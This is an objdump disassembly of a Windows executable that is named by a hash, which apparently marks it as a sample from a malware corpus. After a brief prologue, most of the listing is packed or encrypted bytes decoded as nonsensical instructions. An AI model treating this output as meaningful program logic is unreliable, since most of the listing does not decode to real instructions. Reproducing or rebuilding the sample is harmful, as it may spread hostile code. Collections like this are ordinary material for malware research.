
3208bda60328be4b72f97b84d671ea8c7c6752fc8e7adc298d9fd056e80deb8b.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x70
  401006:	mov    DWORD PTR [ebp-0x48],0x0
  40100d:	mov    DWORD PTR [ebp-0x18],0x0
  401014:	mov    DWORD PTR [ebp-0x70],0x0
  40101b:	mov    DWORD PTR [ebp-0x60],0x0
  401022:	mov    DWORD PTR [ebp-0x8],0x0
  401029:	mov    DWORD PTR [ebp-0x6c],0x0
  401030:	mov    DWORD PTR [ebp-0x68],0x0
  401037:	mov    DWORD PTR [ebp-0x14],0x0
  40103e:	mov    DWORD PTR [ebp-0x4c],0x0
  401045:	mov    DWORD PTR [ebp-0x10],0x0
  40104c:	mov    DWORD PTR [ebp-0x58],0x0
  401053:	mov    DWORD PTR [ebp-0x4],0x0
  40105a:	mov    DWORD PTR [ebp-0x5c],0x0
  401061:	mov    DWORD PTR [ebp-0x30],0x0
  401068:	mov    DWORD PTR [ebp-0x54],0x0
  40106f:	mov    DWORD PTR [ebp-0x2c],0x0
  401076:	mov    DWORD PTR [ebp-0x50],0x0
  40107d:	mov    DWORD PTR [ebp-0xc],0x0
  401084:	mov    eax,ds:0x448fa8
  401089:	mov    DWORD PTR [ebp-0x28],eax
  40108c:	mov    ecx,DWORD PTR ds:0x448fac
  401092:	mov    DWORD PTR [ebp-0x24],ecx
  401095:	mov    edx,DWORD PTR ds:0x448fb0
  40109b:	mov    DWORD PTR [ebp-0x20],edx
  40109e:	mov    al,ds:0x448fb4
  4010a3:	mov    BYTE PTR [ebp-0x1c],al
  4010a6:	mov    ecx,DWORD PTR ds:0x448fb8
  4010ac:	mov    DWORD PTR [ebp-0x40],ecx
  4010af:	mov    edx,DWORD PTR ds:0x448fbc
  4010b5:	mov    DWORD PTR [ebp-0x3c],edx
  4010b8:	mov    eax,ds:0x448fc0
  4010bd:	mov    DWORD PTR [ebp-0x38],eax
  4010c0:	mov    cx,WORD PTR ds:0x448fc4
  4010c7:	mov    WORD PTR [ebp-0x34],cx
  4010cb:	mov    dl,BYTE PTR ds:0x448fc6
  4010d1:	mov    BYTE PTR [ebp-0x32],dl
  4010d4:	mov    DWORD PTR [ebp-0x30],0x40
  4010db:	lea    eax,[ebp-0x40]
  4010de:	push   eax
  4010df:	lea    ecx,[ebp-0x10]
  4010e2:	push   ecx
  4010e3:	call   DWORD PTR ds:0x417000
  4010e9:	test   eax,eax
  4010eb:	je     0x4152d6
  4010f1:	mov    edx,DWORD PTR [ebp-0x10]
  4010f4:	add    edx,0x1
  4010f7:	mov    DWORD PTR [ebp-0x10],edx
  4010fa:	sar    DWORD PTR ds:0xe364a1db,0xe3
  401101:	pop    ebx
  401102:	xor    al,0xe3
  401104:	mov    bl,0xd9
  401106:	sbb    eax,0x88369954
  40110b:	sub    bh,BYTE PTR [edi+0x23a40593]
  401111:	pusha  
  401112:	in     eax,dx
  401113:	pop    ds
  401114:	ja     0x4010df
  401116:	mov    dl,BYTE PTR [esi-0x5bf5477d]
  40111c:	cmp    al,0x56
  40111e:	lds    edx,FWORD PTR [edi+ebx*1-0x2005e426]
  401125:	push   esi
  401126:	daa    
  401127:	mov    eax,0x58ac1a69
  40112c:	jle    0x401164
  40112e:	inc    ecx
  40112f:	sub    al,0x77
  401131:	icebp  
  401132:	lea    esp,[ebx]
  401134:	jne    0x40114c
  401136:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401137:	ss mov edx,0x72dc51d8
  40113d:	jecxz  0x4010e5
  40113f:	push   ss
  401140:	jg     0x401168
  401142:	vmwrite esp,DWORD PTR [ebx]
  401145:	sbb    al,0xb5
  401147:	jp     0x4010e2
  401149:	adc    eax,DWORD PTR [ebx]
  40114b:	mov    bh,0x5b
  40114d:	mov    ebx,0x147e2731
  401152:	and    ebx,edx
  401154:	das    
  401155:	xchg   edx,eax
  401156:	out    dx,eax
  401157:	test   eax,0xb2068206
  40115c:	mov    ebx,0x530fc73
  401161:	sbb    al,0x81
  401163:	jecxz  0x40117a
  401165:	mov    dl,0x20
  401167:	ja     0x40119a
  401169:	ins    BYTE PTR es:[edi],dx
  40116a:	loopne 0x401143
  40116c:	inc    edi
  40116d:	int3   
  40116e:	inc    ebx
  40116f:	popa   
  401170:	push   ecx
  401171:	push   esi
  401172:	adc    ch,bl
  401174:	or     BYTE PTR [edx+0x2d3e251c],al
  40117a:	cmp    BYTE PTR [ebp+eiz*1-0x4331cc63],bl
  401181:	(bad)  
  401182:	dec    esp
  401183:	mov    ch,0xb0
  401185:	les    edi,FWORD PTR [edi]
  401187:	mov    WORD PTR [ecx+eax*8-0x5b21fe85],gs
  40118e:	xor    DWORD PTR [edi],eax
  401190:	mov    eax,0xdc76c72e
  401195:	or     al,BYTE PTR [esi-0x37]
  401198:	mov    eax,0x9cbbe24d
  40119d:	es call 0xd22be63b
  4011a3:	pop    es
  4011a4:	sti    
  4011a5:	xor    DWORD PTR [ebp-0x14aa2f62],0x55
  4011ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4011ad:	sbb    BYTE PTR [ebx-0x22],ch
  4011b0:	and    ebp,esi
  4011b2:	inc    ebp
  4011b3:	push   ebp
  4011b4:	add    ebp,ebp
  4011b6:	pop    edx
  4011b7:	test   eax,0x2e9cc1f4
  4011bc:	sub    BYTE PTR [edi-0x6],al
  4011bf:	fisubr DWORD PTR [edx+0x26]
  4011c2:	rol    DWORD PTR [ecx+0x21589031],0xb0
  4011c9:	or     BYTE PTR [esi],bl
  4011cb:	mov    ds:0xcbfc22bc,al
  4011d0:	or     eax,0xf7a7a654
  4011d5:	add    edi,DWORD PTR [ecx]
  4011d7:	in     eax,0xfe
  4011d9:	inc    ebp
  4011da:	adc    eax,0xdd6dc626
  4011df:	mov    dh,BYTE PTR [edi-0xf]
  4011e2:	mov    esp,0x43fcb541
  4011e7:	sbb    al,BYTE PTR [ebx]
  4011e9:	loope  0x4011de
  4011eb:	xor    al,0x8
  4011ed:	xchg   esp,eax
  4011ee:	retf   
  4011ef:	push   ebx
  4011f0:	push   es
  4011f1:	sete   BYTE PTR [ebx-0x2e]
  4011f5:	cdq    
  4011f6:	jo     0x40118a
  4011f8:	daa    
  4011f9:	inc    edi
  4011fa:	jg     0x4011a9
  4011fc:	mov    edx,0x9a7aac0
  401201:	push   esp
  401202:	xchg   edx,eax
  401203:	outs   dx,DWORD PTR ds:[esi]
  401204:	ret    
  401205:	dec    eax
  401206:	jmp    0x356a:0x2ffaf0e0
  40120d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40120e:	mov    edi,0x8afb5847
  401213:	xchg   edx,eax
  401214:	jnp    0x401246
  401216:	popa   
  401217:	arpl   dx,bp
  401219:	and    BYTE PTR [edx+ebx*2+0x7d40e26e],cl
  401220:	sub    al,0x1e
  401222:	ins    DWORD PTR es:[edi],dx
  401223:	pop    edi
  401224:	add    eax,0x4d4e0516
  401229:	push   edi
  40122a:	adc    bh,ch
  40122c:	dec    ebp
  40122d:	pushf  
  40122e:	mov    esi,0x48b9f81e
  401233:	mov    dh,0x28
  401235:	es mov ecx,0xe906982e
  40123b:	pop    ebx
  40123c:	jp     0x4011d6
  40123e:	mov    ecx,0x9979d205
  401243:	adc    eax,0x671d25f4
  401248:	fs (bad) 
  40124a:	sahf   
  40124b:	jne    0x401298
  40124d:	add    eax,0x2a166781
  401252:	cmovae ebp,esi
  401255:	mov    dh,0xa6
  401257:	cmc    
  401258:	outs   dx,BYTE PTR ds:[esi]
  401259:	ret    0x9fec
  40125c:	adc    BYTE PTR ds:0x7e3989cb,cl
  401262:	xchg   DWORD PTR [ebp-0x1d],eax
  401265:	popf   
  401266:	sub    DWORD PTR [edx-0x2],edx
  401269:	imul   edx,DWORD PTR [edi],0x12b7efc5
  40126f:	dec    ebp
  401270:	sub    eax,0x3d986aea
  401275:	xchg   ebp,eax
  401276:	jne    0x401200
  401278:	jle    0x4012f0
  40127a:	xchg   ecx,eax
  40127b:	mov    dl,0x7b
  40127d:	and    eax,0x485765cd
  401282:	mov    al,ds:0xdb664717
  401287:	mov    eax,ds:0xa6fb3f1
  40128c:	cmp    esp,DWORD PTR [esi-0x3f]
  40128f:	pop    ebp
  401290:	stos   DWORD PTR es:[edi],eax
  401291:	popf   
  401292:	imul   ebp,DWORD PTR [ebx-0x21eb8855],0xc438f088
  40129c:	out    0xb9,eax
  40129e:	icebp  
  40129f:	jmp    0x501b9c5
  4012a4:	stos   BYTE PTR es:[edi],al
  4012a5:	mov    WORD PTR [eax],fs
  4012a7:	push   ss
  4012a8:	and    eax,0xd8bb1119
  4012ad:	ja     0x401279
  4012af:	pop    ss
  4012b0:	lds    ebx,FWORD PTR [edi+0x241c3e8b]
  4012b6:	cmp    dl,dh
  4012b8:	je     0x401324
  4012ba:	retf   0xa1a4
  4012bd:	xchg   dh,dl
  4012bf:	ds jecxz 0x40133e
  4012c2:	jne    0x4012e6
  4012c4:	aas    
  4012c5:	pop    ss
  4012c6:	jae    0x4012b8
  4012c8:	(bad)  
  4012c9:	and    eax,edi
  4012cb:	jecxz  0x401250
  4012cd:	mov    WORD PTR [eax],?
  4012cf:	adc    edi,DWORD PTR [ebp*8-0x5e58356f]
  4012d6:	rcl    dh,cl
  4012d8:	out    0xd,eax
  4012da:	je     0x4012e3
  4012dc:	fnsave [ebx+0x72f29ec1]
  4012e2:	push   edi
  4012e3:	jmp    0x4012b1
  4012e5:	retf   0x6471
  4012e8:	cmp    edx,DWORD PTR [ebx+0x37]
  4012eb:	test   eax,0xf4e46dd2
  4012f0:	aas    
  4012f1:	sbb    bh,bl
  4012f3:	in     eax,0x3a
  4012f5:	std    
  4012f6:	aad    0x4
  4012f8:	scas   eax,DWORD PTR es:[edi]
  4012f9:	adc    DWORD PTR [edi+0x70],edi
  4012fc:	aas    
  4012fd:	cmp    dl,BYTE PTR [edx-0x229082f8]
  401303:	sti    
  401304:	inc    edx
  401305:	adc    al,0x79
  401307:	leave  
  401308:	int    0xb5
  40130a:	aas    
  40130b:	push   ds
  40130c:	jno    0x40129a
  40130e:	push   eax
  40130f:	and    ecx,DWORD PTR [ecx-0x7b3f06d5]
  401315:	ret    0xaff4
  401318:	addr16 mov esi,0xbcf9538e
  40131e:	or     dh,BYTE PTR [edi+0x79cac64b]
  401324:	outs   dx,BYTE PTR ds:[esi]
  401325:	cmc    
  401326:	test   BYTE PTR ds:0x7e1d38a6,cl
  40132c:	mov    ds:0x4e68f6f3,al
  401331:	out    0xb0,eax
  401333:	xchg   edi,eax
  401334:	popa   
  401335:	jne    0x4012b8
  401337:	mov    cl,0x7a
  401339:	push   eax
  40133a:	int3   
  40133b:	arpl   di,dx
  40133d:	sbb    al,bh
  40133f:	das    
  401340:	dec    ecx
  401341:	and    eax,ebp
  401343:	jmp    0x4013c3
  401345:	add    al,0xce
  401347:	out    0xe1,al
  401349:	call   0x25242424
  40134e:	test   DWORD PTR [esi+ecx*1],edx
  401351:	xchg   ecx,eax
  401352:	pop    ss
  401353:	adc    cl,BYTE PTR [ebx+0x2eea200b]
  401359:	cmp    al,0x9
  40135b:	dec    ebp
  40135c:	imul   BYTE PTR [esi-0xc]
  40135f:	fwait
  401360:	inc    ebx
  401361:	cwde   
  401362:	add    DWORD PTR [eax],eax
  401364:	xchg   BYTE PTR [edi*8-0x4a854d03],ch
  40136b:	dec    edi
  40136c:	sub    eax,0xa106f225
  401371:	out    dx,eax
  401372:	add    ah,ah
  401374:	loop   0x40135a
  401376:	xor    dh,BYTE PTR [edx]
  401378:	mov    db6,ecx
  40137b:	cmp    BYTE PTR [esi+ecx*2+0x1e08455],ch
  401382:	les    ebp,FWORD PTR [ebx]
  401384:	add    edx,DWORD PTR [eax-0x37]
  401387:	not    DWORD PTR [ebx+0x67368c43]
  40138d:	push   es
  40138e:	push   ebx
  40138f:	stos   BYTE PTR es:[edi],al
  401390:	push   es
  401391:	imul   BYTE PTR [eax]
  401393:	fiadd  WORD PTR [ebx-0xe]
  401396:	xchg   edx,eax
  401397:	dec    edi
  401398:	mov    ch,BYTE PTR ds:0xff87c2c7
  40139e:	rcl    DWORD PTR [ecx],1
  4013a0:	and    DWORD PTR [ebx-0x5c7a019a],ebp
  4013a6:	clc    
  4013a7:	push   0x43
  4013a9:	hlt    
  4013aa:	adc    esi,DWORD PTR [edx-0x5c]
  4013ad:	add    bl,al
  4013af:	jecxz  0x401396
  4013b1:	mov    ebp,0x751247db
  4013b6:	(bad)  
  4013b7:	mov    ss,WORD PTR [esi+0x51]
  4013ba:	aad    0xd6
  4013bc:	add    edx,DWORD PTR [edi+edi*4-0x460d76be]
  4013c3:	xlat   BYTE PTR ds:[ebx]
  4013c4:	jle    0x401428
  4013c6:	or     BYTE PTR [edi],bh
  4013c8:	xchg   dh,cl
  4013ca:	mov    ebp,0x66d975e0
  4013cf:	cmp    dl,BYTE PTR [edx+0x7e]
  4013d2:	push   ss
  4013d3:	inc    edi
  4013d4:	(bad)  
  4013d6:	push   cs
  4013d7:	mov    bl,0x1e
  4013d9:	icebp  
  4013da:	mov    edx,0xe8edc419
  4013df:	retf   
  4013e0:	stos   DWORD PTR es:[edi],eax
  4013e1:	mov    edi,0x183b6e5c
  4013e6:	loopne 0x4013b7
  4013e8:	into   
  4013e9:	sub    eax,DWORD PTR [edx+0x7f]
  4013ec:	push   ecx
  4013ed:	xlat   BYTE PTR ds:[ebx]
  4013ee:	adc    eax,0xa1441763
  4013f3:	arpl   WORD PTR [edx+esi*8],ax
  4013f6:	jp     0x4013c4
  4013f8:	jmp    0x9e4e:0x9cd3112b
  4013ff:	ret    
  401400:	mov    esi,0x3f19f5d8
  401405:	sub    DWORD PTR [eax+0x19e299e5],eax
  40140b:	lahf   
  40140c:	lock pop ebp
  40140e:	popa   
  40140f:	inc    eax
  401410:	cmp    al,0xc5
  401412:	xor    eax,0xd9357209
  401417:	mov    ah,0x58
  401419:	mov    edi,0xcc8b2c55
  40141e:	stc    
  40141f:	mov    ds:0xd20a908b,eax
  401424:	scas   eax,DWORD PTR es:[edi]
  401425:	std    
  401426:	push   eax
  401427:	call   0xeb4f:0x13a76953
  40142e:	adc    DWORD PTR [edx+esi*1],ebp
  401431:	adc    DWORD PTR [eax],ebx
  401433:	or     eax,0xb73f8226
  401438:	test   DWORD PTR [edx-0x41],ebx
  40143b:	sub    al,0x84
  40143d:	gs mov esp,0x97d20010
  401443:	icebp  
  401444:	and    dh,0xb7
  401447:	dec    edx
  401448:	fidivr DWORD PTR [eax]
  40144a:	das    
  40144b:	adc    eax,0xf5de8ac9
  401450:	add    dl,BYTE PTR [edi+0x11ae8281]
  401456:	lock xchg esi,eax
  401458:	(bad)  
  401459:	(bad)  [ebp-0x64]
  40145c:	adc    eax,0xe9a8f9b2
  401461:	stos   BYTE PTR es:[edi],al
  401462:	jle    0x4014b8
  401464:	dec    ebx
  401465:	fcmovu st,st(7)
  401467:	fiadd  DWORD PTR [esi+eax*4-0x2e79c65d]
  40146e:	add    esi,eax
  401470:	jae    0x401463
  401472:	sub    al,BYTE PTR [ebp-0x75a88aaa]
  401478:	jge    0x40148e
  40147a:	neg    DWORD PTR [edi+0x274cc9c6]
  401480:	test   DWORD PTR [ebp+0x4a4743af],esp
  401486:	mov    BYTE PTR [ecx+ebx*4-0x76],0x8b
  40148b:	mov    ebx,0xc180a57a
  401490:	js     0x4014f2
  401492:	mov    eax,0x3aec6210
  401497:	and    al,0x0
  401499:	jg     0x4014e7
  40149b:	mov    cl,BYTE PTR [eax]
  40149d:	arpl   bp,ax
  40149f:	inc    ebx
  4014a0:	dec    ebp
  4014a1:	push   ss
  4014a2:	jp     0x4014e1
  4014a4:	sbb    al,0x38
  4014a6:	add    BYTE PTR [ebp-0x614dd003],ch
  4014ac:	pop    esi
  4014ad:	ret    0x35a
  4014b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4014b1:	call   0xfccd:0x88753b13
  4014b8:	cmp    al,0xbd
  4014ba:	pop    es
  4014bb:	cmp    eax,edi
  4014bd:	repnz mov esi,0x7110f3de
  4014c3:	sub    DWORD PTR [edi],esp
  4014c5:	outs   dx,DWORD PTR ds:[esi]
  4014c6:	mov    BYTE PTR [edi],ah
  4014c8:	and    DWORD PTR [edi],esi
  4014ca:	mov    esi,cs
  4014cc:	mov    esi,0x373b1fde
  4014d1:	mov    ch,BYTE PTR [edx-0x5f4c100]
  4014d7:	sub    ebx,DWORD PTR ds:[edx+ecx*4+0x1d]
  4014dc:	or     esp,ebp
  4014de:	dec    eax
  4014df:	test   edx,esp
  4014e1:	mov    bl,0xab
  4014e3:	push   ecx
  4014e4:	call   0x801d:0x7b7ac1d2
  4014eb:	shr    DWORD PTR [edi],1
  4014ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4014ee:	scas   eax,DWORD PTR es:[edi]
  4014ef:	and    ebx,0x57
  4014f2:	fsubr  DWORD PTR [ebp+0x5b]
  4014f5:	outs   dx,DWORD PTR ds:[esi]
  4014f6:	or     BYTE PTR [edx+ebx*1+0x6c291b21],cl
  4014fd:	rcl    DWORD PTR [ebp+0x4a],0x16
  401501:	mov    es:0x27b8e0a5,al
  401507:	lods   eax,DWORD PTR ds:[esi]
  401508:	int    0xb0
  40150a:	enter  0xa8cc,0x98
  40150e:	mov    esp,DWORD PTR [eax+esi*2]
  401511:	inc    edx
  401512:	iret   
  401513:	sub    esi,ebx
  401515:	cmc    
  401516:	addr16 inc edi
  401518:	add    DWORD PTR [edi+0x4d],ebp
  40151b:	jno    0x401530
  40151d:	xchg   ebp,eax
  40151e:	dec    ecx
  40151f:	jns    0x401513
  401521:	pop    ecx
  401522:	rcl    DWORD PTR [edi+0x44],0x1a
  401526:	xchg   DWORD PTR ds:0x23c49eb9,edx
  40152c:	xchg   esi,eax
  40152d:	ss (bad) 
  40152f:	out    0x57,al
  401531:	xchg   BYTE PTR [ebx-0x70],ah
  401534:	mov    ecx,0x39f1a710
  401539:	push   ds
  40153a:	add    esi,0xe6783369
  401540:	sbb    edx,DWORD PTR [edx-0x71]
  401543:	in     eax,0xe5
  401545:	mov    dh,0x58
  401547:	fmulp  st(0),st
  401549:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40154a:	mov    dl,BYTE PTR [edx-0x45]
  40154d:	ins    DWORD PTR es:[edi],dx
  40154e:	fwait
  40154f:	jno    0x4014eb
  401551:	mov    bh,0xcf
  401553:	pop    ebp
  401554:	frstor [edi]
  401556:	pop    edi
  401557:	adc    eax,0x9e164d30
  40155c:	leave  
  40155d:	pop    eax
  40155e:	mov    edi,0xb6fb0dcb
  401563:	sub    dh,BYTE PTR [esi+eiz*8-0x7856124f]
  40156a:	popa   
  40156b:	xchg   esp,eax
  40156c:	ds mov edx,0x321b112e
  401572:	shl    BYTE PTR [eax-0x37427665],0x8f
  401579:	out    dx,eax
  40157a:	mul    DWORD PTR [ebx+0x3421b28a]
  401580:	push   0x44c3b3
  401585:	fs push es
  401587:	and    ecx,esi
  401589:	sub    eax,0x7bb2de88
  40158e:	outs   dx,BYTE PTR ds:[esi]
  40158f:	xlat   BYTE PTR ds:[ebx]
  401590:	or     ebp,DWORD PTR [edi]
  401592:	sti    
  401593:	cs pushf 
  401595:	les    ecx,FWORD PTR ds:0xbfa815aa
  40159b:	ins    BYTE PTR es:[edi],dx
  40159c:	not    BYTE PTR [edx]
  40159e:	(bad)  
  40159f:	and    BYTE PTR [edx-0x7a],dl
  4015a2:	jecxz  0x4015ab
  4015a4:	and    edi,esp
  4015a6:	mov    ds:0xe1290aaa,al
  4015ab:	rol    BYTE PTR [edi+0x1a],cl
  4015ae:	push   eax
  4015af:	ss cli 
  4015b1:	repz in eax,0x30
  4015b4:	pop    ebx
  4015b5:	fadd   st(7),st
  4015b7:	sbb    al,BYTE PTR [ecx+0xb513a27]
  4015bd:	les    esp,FWORD PTR [edi]
  4015bf:	loopne 0x4015db
  4015c1:	hlt    
  4015c2:	fcomi  st,st(6)
  4015c4:	mov    ebp,0xea2d220d
  4015c9:	int3   
  4015ca:	(bad)  
  4015cb:	shl    eax,0x67
  4015ce:	dec    ecx
  4015cf:	push   edx
  4015d0:	fnsave [ebp+0x69]
  4015d3:	shl    BYTE PTR es:[edx],cl
  4015d6:	cmc    
  4015d7:	ins    BYTE PTR es:[edi],dx
  4015d8:	jp     0x4015bf
  4015da:	xchg   cl,dh
  4015dc:	ins    BYTE PTR es:[edi],dx
  4015dd:	cmp    BYTE PTR [edi-0x61bb180f],0xa2
  4015e4:	adc    BYTE PTR [edx-0x5e],ch
  4015e7:	cs cmp eax,0xf9c21510
  4015ed:	ret    0x460d
  4015f0:	int3   
  4015f1:	pop    es
  4015f2:	cli    
  4015f3:	scas   eax,DWORD PTR es:[edi]
  4015f4:	loop   0x401579
  4015f6:	push   edi
  4015f7:	mov    ebx,0x8bcebf43
  4015fc:	mov    cl,0x2e
  4015fe:	loopne 0x4015f6
  401600:	and    ch,BYTE PTR [ecx-0xd]
  401603:	jo     0x4015f4
  401605:	imul   edx,DWORD PTR [edi+0x40a89e86],0x8e5226ee
  40160f:	adc    eax,0x59a8a66f
  401614:	loope  0x40160a
  401616:	shl    DWORD PTR [edx+0x74],1
  401619:	mov    ecx,ebx
  40161b:	lock pop ds
  40161d:	push   cs
  40161e:	adc    BYTE PTR [ebx],0x38
  401621:	mov    dh,0xfa
  401623:	cmp    BYTE PTR [eax],cl
  401625:	sub    al,0x39
  401627:	xchg   ebx,eax
  401628:	push   ebp
  401629:	test   eax,0x89d7b806
  40162e:	and    dh,al
  401630:	stc    
  401631:	mov    cl,BYTE PTR [ecx+0x0]
  401634:	stos   DWORD PTR es:[edi],eax
  401635:	popa   
  401636:	lahf   
  401637:	out    0xc0,eax
  401639:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40163a:	jns    0x40161d
  40163c:	lods   al,BYTE PTR ds:[esi]
  40163d:	cmp    al,0xbc
  40163f:	mov    ch,0x59
  401641:	sbb    eax,0x567815f0
  401646:	xchg   al,bh
  401648:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40164a:	repnz in eax,dx
  40164c:	ror    DWORD PTR [edx],cl
  40164e:	mov    ah,0x8
  401650:	xchg   edx,eax
  401651:	(bad)  
  401652:	jno    0x4016c1
  401654:	pop    ebx
  401655:	xchg   edi,eax
  401656:	addr16 icebp 
  401658:	fucomp st(1)
  40165a:	adc    al,0x2f
  40165c:	push   0xffffffbb
  40165e:	daa    
  40165f:	pusha  
  401660:	nop
  401661:	jle    0x40162e
  401663:	xchg   ebp,eax
  401664:	adc    al,0xf9
  401666:	xor    DWORD PTR [ecx+0x66],edx
  401669:	pop    ss
  40166a:	or     dl,0xfa
  40166d:	or     al,0xa0
  40166f:	xor    DWORD PTR [edi+edx*2+0x38],0x3b
  401674:	retf   0x9b24
  401677:	and    ecx,esp
  401679:	or     ah,BYTE PTR [edi]
  40167b:	add    eax,0x6fd256a2
  401680:	jnp    0x401614
  401682:	mov    edx,0x4bf75d
  401687:	aam    0x72
  401689:	(bad)  
  40168a:	retf   0x99ff
  40168d:	push   0x2d92616a
  401692:	pop    ecx
  401693:	cmp    BYTE PTR [ebp+0x3b2ae5b3],bh
  401699:	xchg   ebx,eax
  40169a:	mov    esp,0x4a1f0476
  40169f:	shr    DWORD PTR [ecx-0x42],0x65
  4016a3:	popa   
  4016a4:	das    
  4016a5:	mov    bh,0x7b
  4016a7:	sbb    DWORD PTR [ecx+0x5a7e4810],esi
  4016ad:	add    dh,dh
  4016af:	test   eax,0x3b718f36
  4016b4:	add    BYTE PTR [esi+0x5a8ca1],bh
  4016ba:	cmovb  ebx,esp
  4016bd:	ficom  DWORD PTR [ecx+0x322a8cf3]
  4016c3:	fiadd  DWORD PTR [ebx+0x64ff50cc]
  4016c9:	mov    eax,ds:0x4d759eda
  4016ce:	sub    al,0x2e
  4016d0:	sub    dh,cl
  4016d2:	xchg   DWORD PTR [eax+0x68],edi
  4016d5:	xor    esi,ebp
  4016d7:	outs   dx,BYTE PTR ds:[esi]
  4016d8:	imul   eax,esp,0x72b3b714
  4016de:	loop   0x4016e7
  4016e0:	mov    ch,0x47
  4016e2:	jmp    0x40172e
  4016e4:	mov    edx,0x1c1b2a3b
  4016e9:	dec    esi
  4016ea:	lock lock xchg ecx,eax
  4016ed:	xchg   ecx,eax
  4016ee:	mov    eax,0x6adc9143
  4016f3:	outs   dx,DWORD PTR ds:[esi]
  4016f4:	fdivr  st,st(6)
  4016f6:	inc    ebx
  4016f7:	(bad)  
  4016f8:	into   
  4016f9:	clc    
  4016fa:	imul   ebp,DWORD PTR [ecx-0x34],0xc2a21db7
  401701:	inc    edi
  401702:	fs jb  0x40174c
  401705:	and    bh,bh
  401707:	and    eax,0x2d3f403a
  40170c:	dec    edi
  40170d:	mov    ch,BYTE PTR [edi-0x7d]
  401710:	mov    cl,0xb1
  401712:	pop    esp
  401714:	in     eax,0x9c
  401716:	mov    bh,0x3b
  401718:	daa    
  401719:	stos   BYTE PTR es:[edi],al
  40171a:	ret    
  40171b:	sub    edx,DWORD PTR [eax-0x3c]
  40171e:	and    eax,0xce2ad3c0
  401723:	xchg   ebx,eax
  401724:	(bad)  
  401725:	outs   dx,BYTE PTR ds:[esi]
  401726:	mov    bl,0xd0
  401728:	mov    al,0x99
  40172a:	jp     0x4016c2
  40172c:	ret    
  40172d:	mov    bl,BYTE PTR [edx]
  40172f:	dec    edx
  401730:	outs   dx,BYTE PTR ds:[esi]
  401731:	pop    es
  401732:	jb     0x4016ec
  401734:	xchg   esp,eax
  401735:	pop    edx
  401736:	fwait
  401737:	out    0x1f,al
  401739:	sub    eax,0xd6c430bb
  40173e:	icebp  
  40173f:	push   cs
  401740:	nop    DWORD PTR [edx+0x37]
  401744:	xor    bh,BYTE PTR [esi-0x4425bd69]
  40174a:	mov    ch,0x6e
  40174c:	js     0x40172b
  40174e:	cs mov gs,eax
  401751:	cli    
  401752:	mov    ebp,0xcbcc56a
  401757:	aad    0x1c
  401759:	push   edi
  40175a:	xchg   DWORD PTR [ebx-0x7ff72056],esi
  401760:	mov    bl,0xc7
  401762:	xchg   DWORD PTR [edi],esi
  401764:	mov    fs:0x4a38c581,eax
  40176a:	mov    ds:0xca333f51,al
  40176f:	aas    
  401770:	arpl   WORD PTR [eax-0x725e8e13],di
  401776:	je     0x401745
  401778:	and    ch,dl
  40177a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40177b:	or     eax,0xe9ffac1a
  401780:	std    
  401781:	dec    eax
  401782:	mov    eax,ds:0x72beb1d
  401787:	enter  0x4225,0x80
  40178b:	ins    BYTE PTR es:[edi],dx
  40178c:	mov    cs,ebx
  40178e:	dec    edi
  40178f:	xchg   ebx,eax
  401790:	jle    0x401781
  401792:	repz cmc 
  401794:	push   edx
  401795:	(bad)  
  401796:	jmp    0xc12ff195
  40179b:	(bad)  
  40179e:	shl    ah,cl
  4017a0:	jecxz  0x401727
  4017a2:	cli    
  4017a3:	push   ss
  4017a4:	sub    ch,ch
  4017a6:	xchg   ebx,eax
  4017a7:	mov    al,ds:0x22a1373f
  4017ac:	xchg   edx,eax
  4017ad:	rcl    BYTE PTR [ecx],cl
  4017af:	sbb    BYTE PTR ds:0x301adc42,bl
  4017b5:	pop    ss
  4017b6:	test   al,0x16
  4017b8:	jmp    0x613a:0x17f98d4a
  4017bf:	scas   al,BYTE PTR es:[edi]
  4017c0:	fbstp  TBYTE PTR [ecx+0x3cb76159]
  4017c6:	mov    ebx,0x4668ecc4
  4017cb:	cdq    
  4017cc:	(bad)  
  4017cd:	(bad)  
  4017ce:	mov    cl,0x7f
  4017d0:	loopne 0x4017c4
  4017d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4017d3:	jno    0x4017f3
  4017d5:	or     DWORD PTR [esp+eax*8-0x62],eax
  4017d9:	jb     0x401813
  4017db:	push   esi
  4017dc:	call   0xbcf9:0x3d133698
  4017e3:	test   DWORD PTR [eax-0x73cebd7],esp
  4017e9:	jbe    0x401786
  4017eb:	sbb    DWORD PTR [esi],0xd75796e
  4017f1:	xor    ebx,DWORD PTR [ecx-0x2c]
  4017f4:	es mov eax,edx
  4017f7:	pmulhw mm1,QWORD PTR [edx-0x1f]
  4017fb:	cmp    DWORD PTR [ecx],ecx
  4017fd:	pop    ebp
  4017fe:	pushf  
  4017ff:	mov    eax,edx
  401801:	loope  0x40180e
  401803:	xor    esi,DWORD PTR [eax-0xd]
  401806:	fiadd  DWORD PTR [eax-0x2d]
  401809:	mov    bh,0x64
  40180b:	xor    ch,0x2b
  40180e:	dec    edi
  40180f:	sbb    BYTE PTR es:[ebp-0x3a],bl
  401813:	out    dx,al
  401814:	jnp    0x401861
  401816:	dec    ebx
  401817:	jge    0x401846
  401819:	jo     0x401827
  40181b:	pop    edx
  40181c:	icebp  
  40181d:	addr16 mov ch,0x35
  401820:	mov    cl,0xec
  401822:	jb     0x4017f2
  401824:	repnz aam 0xe2
  401827:	jb     0x401828
  401829:	jle    0x401811
  40182b:	jo     0x40184f
  40182d:	lahf   
  40182e:	loopne 0x40180f
  401830:	paddq  mm1,QWORD PTR [edx+0x5f]
  401834:	stos   BYTE PTR es:[edi],al
  401835:	or     BYTE PTR [esi+0x2],0x1b
  401839:	loope  0x4017c5
  40183b:	lds    esp,FWORD PTR [ecx-0x1f]
  40183e:	mov    ecx,0x3db08096
  401843:	cs xchg ecx,eax
  401845:	cmp    BYTE PTR [ebp+0x59],0x9b
  401849:	inc    eax
  40184a:	imul   edi,DWORD PTR [esi+0x1d],0xffffff94
